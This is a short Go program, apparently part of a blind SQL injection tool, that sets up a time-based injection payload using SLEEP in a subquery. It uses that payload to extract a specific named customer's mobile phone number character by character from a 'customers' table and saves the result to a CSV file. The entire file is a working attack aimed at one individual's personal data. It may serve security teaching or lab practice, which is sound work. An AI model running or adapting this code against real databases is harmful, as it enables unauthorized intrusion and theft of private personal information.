package main

import (
	"fmt"

	"github.com/remoschaer86/blind-sql-go/internal/attack"
)

func execSql(likestr string, sleep int) string {
	sc := fmt.Sprintf(`
	(SELECT
		CASE WHEN COUNT(*) > 0 THEN SLEEP(%d) ELSE SLEEP(0) END AS sleep_time
		FROM
		glocken_emil.customers
	WHERE surname='Fischer' AND name="Sandra" AND mobile LIKE '%s')
`, sleep, likestr)
	return sc
}

func main() {

	const charset = "0123456789-"

	tba := attack.NewTimeBasedAttack(charset, execSql, 3)

	err := tba.Launch("../../data/sandra_fischer_phone.csv", 100)

	if err != nil {
		panic(err)
	}

}
